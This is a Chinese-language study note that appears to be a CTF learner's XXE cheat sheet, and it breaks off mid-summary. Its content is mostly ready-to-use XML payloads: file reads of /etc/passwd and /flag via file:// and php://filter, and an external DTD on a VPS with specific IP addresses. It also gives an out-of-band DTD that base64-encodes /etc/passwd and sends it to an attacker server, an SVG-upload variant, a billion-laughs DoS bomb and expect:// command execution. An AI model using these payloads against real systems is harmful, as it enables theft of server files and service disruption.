

## 伪协议

#### 读取文件

```dtd
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag">
]>
<root>&xxe;</root>
```

---

## 有回显`XXE`利用

#### 利用`VPS`

1. 编写一个`dtd`文档，名字为`evil.dtd`

```dtd
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

2. 放在云服务器上，开启服务

```bash
python3 -m http.server
```

3. 编写xml文档，测试漏洞

```xml
<?xml version="1.0"?>
<!DOCTYPE test SYSTEM "http://129.204.59.142:8000/evil.dtd">
<test>
    <data>&xxe;</data>
</test>
```

---

## 无回显`XXE`攻击

#### 一般实体

定义实现：
```xml
<!ENTITY 实体名 "内容">
<!ENTITY 实体名 SYSTEM "外部文件">
```

具体XML文档：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ELEMENT info (#PCDATA)>
  <!ENTITY company "腾讯科技有限公司">
]>
<test>
  <info>公司名称：&company;</info>
</test>
```

其实这些就是上一个`md`文档所学的知识



#### 参数实体

参数实体：给`dtd`自己用的 ——>写法： %实体名

```dtd
<!ENTITY % 实体名 "内容">
<!ENTITY % 实体名 SYSTEM "外部文件">
```

具体xml文档：

```dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!-- 定义外部参数实体 -->
  <!ENTITY % extFile SYSTEM "ext.dtd">
  <!-- 使用：引入外部dtd内容 -->
  %extFile;
]>
<test>
  <age>18</age>
</test>
```



#### 读取数据（重要）

1. 开启`VP`S服务

```bash
python3 -m http.server
```



2. 创建一个`dtd`文件

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://VPS:8000/?data=%file;'>">
```



```
第一行：

1、参数实体，名字叫：file
2. 作用：读取服务器文件 /etc/passwd 并且用 base64 编码 输出（防止特殊字符报错）
3. 最终效果：%file; = /etc/passwd 的 base64 编码内容
```

```
第二行：

1. 这是一个参数实体，名字叫 int
2. 它的值是一长串字符串：<!ENTITY &#37; send SYSTEM 'http://49.234.199.152:8000/?data=%file;'>
3. 因为不能直接写 %，所以用编码 "&#37;" 代替。
4. 第二个参数实体 send作用是：把 % file（读取到的文件内容）发送到攻击者服务器
```

```
总结：

1、%file：帮我读服务器文件
2、%int：帮我打包一个发送请求
3、%send：帮我把文件内容发回给我
```



3. 输入xml代码

```dtd
<?xml version="1.0"?> 
<!DOCTYPE foo [
<!ENTITY % remote SYSTEM "http://VPS:8000/evil_2.dtd">
%remote;
%int;
%send;
]>
<foo></foo>
```

---

## SVG上传XXE

创建xxe.svg文件：

```dtd
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>
```

直接上传文件即可

---

## dos攻击

XML实体膨胀攻击，也叫XML炸弹

```dtd
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

攻击原理：

```dtd
<!ENTITY lol "lol">         <!-- 3个字符 -->
<!ENTITY lol2 "&lol;×10">   <!-- 3×10 = 30 -->
<!ENTITY lol3 "&lol2;×10">  <!-- 30×10 = 300 -->
<!ENTITY lol4 "&lol3;×10">  <!-- 300 → 3000 -->
<!ENTITY lol5 "&lol4;×10">  <!-- 3万 -->
<!ENTITY lol6 "&lol5;×10">  <!-- 30万 -->
<!ENTITY lol7 "&lol6;×10">  <!-- 300万 -->
<!ENTITY lol8 "&lol7;×10">  <!-- 3000万 -->
<!ENTITY lol9 "&lol8;×10">  <!-- 3亿！！！ -->
```

---

## 命令执行

```dtd
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

这是由于配置不当导致的，一般都是禁用状态



---



## 总结

1. 使用file://读取文件
2. http://